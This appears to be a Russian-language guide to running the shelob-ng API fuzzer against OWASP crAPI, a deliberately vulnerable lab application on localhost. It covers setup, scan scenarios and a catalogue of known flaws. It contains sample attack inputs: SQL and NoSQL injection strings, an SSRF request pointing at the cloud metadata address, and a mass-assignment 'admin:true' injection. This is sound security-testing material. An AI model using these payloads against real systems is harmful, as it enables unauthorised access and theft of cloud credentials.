# shelob-ng / crAPI — Complete Fuzzing Guide

[crAPI](https://github.com/OWASP/crAPI) (Completely Ridiculous API) — флагманский проект
OWASP для тестирования API security. Полный набор OWASP API Top 10 (2023) + LLM injection.
Реалистичная полиязычная микросервисная архитектура: Java (identity) + Go (community) + Python/Django (workshop).

---

## Быстрый старт

```bash
# 1. Запустить crAPI (из upstream репозитория)
git clone https://github.com/OWASP/crAPI.git /opt/crapi
cd /opt/crapi/deploy/docker
docker compose -f docker-compose.minimal.yml up -d
# Ждать ~60 сек

# 2. Подтвердить email через Mailhog: http://localhost:8025

# 3. Запустить фаззер
cd /path/to/shelob-ng/example/crapi/
make setup   # регистрация аккаунтов
make run-1   # базовый скан identity service
make run-2   # BOLA detection
```

---

## Архитектура crAPI

```
localhost:8888  — identity service (Java/Spring) — основная spec
localhost:8888  — community service (Go)         — /community/api/*
localhost:8888  — workshop service (Python)       — /workshop/api/*
localhost:8025  — Mailhog (email verification)
```

**Один OpenAPI spec** (`openapi-spec/crapi-openapi-spec.json`) покрывает только
identity service. Community и Workshop endpoints требуют отдельной работы.

---

## Предварительные требования

| | |
|-|-|
| Docker + Compose v1.27+ | запуск crAPI |
| ~4 GB RAM | минимальное требование |
| Go ≥ 1.22 | сборка shelob-ng |
| Python 3 | setup скрипт |

---

## Установка

```bash
# Клонировать crAPI
git clone https://github.com/OWASP/crAPI.git /opt/crapi

# Запустить (minimal = меньше RAM)
cd /opt/crapi/deploy/docker
docker compose -f docker-compose.minimal.yml up -d

# Дождаться готовности (~60 сек)
until curl -s http://localhost:8888/identity/api/health > /dev/null 2>&1; do
    echo -n "."; sleep 3
done; echo " ready!"

# Проверить Mailhog
curl -s http://localhost:8025/api/v2/messages | python3 -c "
import json,sys; d=json.load(sys.stdin); print('Mailhog messages:', d.get('count', 0))
"
```

### Регистрация аккаунтов (обязательно)

```bash
# Зарегистрировать основного пользователя
curl -s -X POST http://localhost:8888/identity/api/auth/signup \
  -H 'Content-Type: application/json' \
  -d '{"name":"Fuzzer","email":"fuzzer@shelob.local","number":"9876543210","password":"Shelob1!"}'

# Зарегистрировать жертву
curl -s -X POST http://localhost:8888/identity/api/auth/signup \
  -H 'Content-Type: application/json' \
  -d '{"name":"Victim","email":"victim@shelob.local","number":"1234567890","password":"Victim1!"}'

# Открыть Mailhog и подтвердить email для обоих аккаунтов
open http://localhost:8025
# или: curl -s http://localhost:8025/api/v2/messages для просмотра
```

---

## Уязвимости crAPI — Каталог

Полный каталог: `docs/knowledge-base/vuln-catalogue.md` (секция crAPI).

| ID | OWASP 2023 | Endpoint | Checker |
|----|-----------|----------|---------|
| C02 | API1 BOLA | `GET /workshop/api/mechanic/mechanic_report?report_id={id}` | NameSpaceRule |
| C03 | API2 Auth | `POST /identity/api/auth/v2/check-otp` | RateLimitChecker |
| C04 | API3 Exposure | `GET /community/api/v2/community/posts/recent` | BehavioralPatterns |
| C07 | API5 BFLA | `DELETE /identity/api/v2/admin/videos/{id}` | BFLA |
| C11 | API7 SSRF | `POST /workshop/api/merchant/contact_mechanic` | BehavioralPatterns |
| C12 | API8 NoSQL | `POST /community/api/v2/coupon/validate-coupon` | BehavioralPatterns |
| C13 | API8 SQLi | `POST /workshop/api/shop/apply_coupon` | BehavioralPatterns |
| C14 | API2 Auth | `/identity/api/v2/user/dashboard` (no auth) | AuthBypassRule |
| C15 | API2 JWT | `/identity/api/auth/jwks.json` + auth endpoints | AuthBypassRule |
| C03 | API4 Rate | `POST /identity/api/auth/v2/check-otp` | **RateLimitChecker** |
| C09/R09 | API8 Config | `/debug` (hidden, не в spec) | **PathDiscovery** |

---

## Сценарии запуска

### Сценарий 1 — Identity Service: базовый скан

```bash
./../../shelob-ng \
  -spec     /opt/crapi/openapi-spec/crapi-openapi-spec.json \
  -url      http://localhost:8888 \
  -user     fuzzer@shelob.local \
  -password Shelob1! \
  -csp-disable \
  -duration 5m \
  -output   results/01_identity_basic
```

**Ожидаемые findings:**
- `PathDiscovery` — проверяет 70+ скрытых путей (Spring Actuator, /debug, /metrics, /actuator/env)
- `AuthBypassRule HIGH` — если `/identity/api/v2/user/dashboard` доступен без auth (C14)
- `RateLimitChecker HIGH` — `/identity/api/auth/v2/check-otp` — нет rate limiting (C03)
- `SchemaViolation` — несоответствия в ответах
- `BehavioralPatterns` — возможные SQL/stack trace в ответах

---

### Сценарий 2 — BOLA: Vehicle и Mechanic Reports

```bash
./../../shelob-ng \
  -spec     /opt/crapi/openapi-spec/crapi-openapi-spec.json \
  -url      http://localhost:8888 \
  -user     fuzzer@shelob.local \
  -password Shelob1! \
  -user2    victim@shelob.local \
  -pass2    Victim1! \
  -csp-disable \
  -duration 15m \
  -output   results/02_bola
```

**Ожидаемые findings:**
- `NameSpaceRule HIGH` — `GET /workshop/api/mechanic/mechanic_report?report_id=X`
  (sequential integer ID, нет ownership check — C02)
- `NameSpaceRule HIGH` — vehicle location endpoint если у обоих пользователей есть машины

**Подготовка машин:**
```bash
# Добавить машину пользователю (нужен токен)
TOKEN=$(curl -s -X POST http://localhost:8888/identity/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"fuzzer@shelob.local","password":"Shelob1!"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")

curl -X POST http://localhost:8888/identity/api/v2/vehicle/add_vehicle \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"vin":"1HGBH41JXMN109186","pincode":"1234"}'
```

---

### Сценарий 3 — Workshop Service: Injection

Workshop service (Python/Django) — отдельная spec нужна.

```bash
# Получить workshop spec (если доступна)
curl -s http://localhost:8888/workshop/api/schema > /tmp/workshop-spec.yaml 2>/dev/null \
  || echo "workshop spec not available via standard endpoint"

# Запустить только с workshop-specific checkers
./../../shelob-ng \
  -spec     /opt/crapi/openapi-spec/crapi-openapi-spec.json \
  -url      http://localhost:8888 \
  -user     fuzzer@shelob.local \
  -password Shelob1! \
  -payloads sqli=../juice-shop/payloads/sqli.txt,\
            nosql=../juice-shop/payloads/nosql.txt \
  -csp-disable \
  -duration 15m \
  -output   results/03_injection
```

**Ожидаемые findings:**
- `BehavioralPatterns HIGH` — SQLi в `/workshop/api/shop/apply_coupon` (C13: `' OR '1'='1`)
- `BehavioralPatterns HIGH` — NoSQL в `/community/api/v2/coupon/validate-coupon` (C12: `{"$ne":""}`)

---

### Сценарий 4 — SSRF: Contact Mechanic

crAPI C11 — `mechanic_api` поле принимает произвольный URL и сервер его запрашивает.
SSRF мутатор автоматически инжектирует внутренние адреса в URL-поля.

```bash
./../../shelob-ng \
  -spec     /opt/crapi/openapi-spec/crapi-openapi-spec.json \
  -url      http://localhost:8888 \
  -user     fuzzer@shelob.local \
  -password Shelob1! \
  -checker  BehavioralPatterns \
  -csp-disable \
  -duration 10m \
  -output   results/04_ssrf
```

**Вручную проверить SSRF:**
```bash
TOKEN=$(curl -s -X POST http://localhost:8888/identity/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"fuzzer@shelob.local","password":"Shelob1!"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")

# SSRF: сервер должен ответить содержимым внутреннего URL
curl -X POST http://localhost:8888/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "mechanic_api": "http://169.254.169.254/latest/meta-data/",
    "car_id": "test",
    "mechanic_code": "TRAC_12987",
    "problem_details": "check brakes",
    "repeat_request_if_failed": false,
    "number_of_repeats": 1
  }'
# Если ответ содержит cloud metadata — C11 подтверждён
```

---

### Сценарий 5 — Mass Assignment: Order Status

crAPI C08/C09 — PUT `/workshop/api/shop/orders/{id}` принимает `status:"returned"`.

```bash
./../../shelob-ng \
  -spec     /opt/crapi/openapi-spec/crapi-openapi-spec.json \
  -url      http://localhost:8888 \
  -user     fuzzer@shelob.local \
  -password Shelob1! \
  -checker  MassAssignment \
  -csp-disable \
  -duration 10m \
  -output   results/05_mass_assignment
```

**MassAssignment checker** инжектирует `{"status":"returned","admin":true,...}` во все
PUT/PATCH/POST запросы. Если сервер возвращает 2xx и отражает injected поля → **HIGH**.

---

### Сценарий 6 — Полный аудит

```bash
./../../shelob-ng \
  -spec       /opt/crapi/openapi-spec/crapi-openapi-spec.json \
  -url        http://localhost:8888 \
  -user       fuzzer@shelob.local   -password Shelob1! \
  -user2      victim@shelob.local   -pass2    Victim1! \
  -payloads   sqli=../juice-shop/payloads/sqli.txt,\
              nosql=../juice-shop/payloads/nosql.txt \
  -corpus-dir corpus/full \
  -csp-disable \
  -duration   30m \
  -output     results/06_full_audit
```

---

## Интерпретация результатов

```bash
# Все findings по severity
for f in results/*/findings/*.json; do
  python3 -c "
import json; d=json.load(open('$f'))
print(f'{d[\"severity\"].upper():6} [{d[\"checker\"]:20}] {d[\"title\"][:50]}')" 2>/dev/null
done | sort -r

# Coverage
python3 -c "
import json
d = json.load(open('results/01_identity_basic/api-coverage.json'))
print(f'Reached: {d[\"visited_count\"]}/{d[\"total\"]} endpoints')
print(f'Success 2xx: {d[\"succeeded_count\"]} endpoints')
if d.get('unvisited'):
    for u in d['unvisited']:
        print(f'  NOT REACHED: {u[\"method\"]} {u[\"path\"]}')
"
```

---

## Troubleshooting

| Проблема | Решение |
|---------|---------|
| Cannot connect to `localhost:8888` | Подождать 60 сек после `docker compose up` |
| Login fails | Не подтверждён email в Mailhog |
| Workshop endpoints → 401 | Workshop использует отдельную JWT validation |
| spec не покрывает workshop/community | Правильно — нужны отдельные spec файлы для каждого сервиса |
| Мало findings за 5 мин | Нормально для identity-only spec (30 paths). Увеличить до 15-30m |
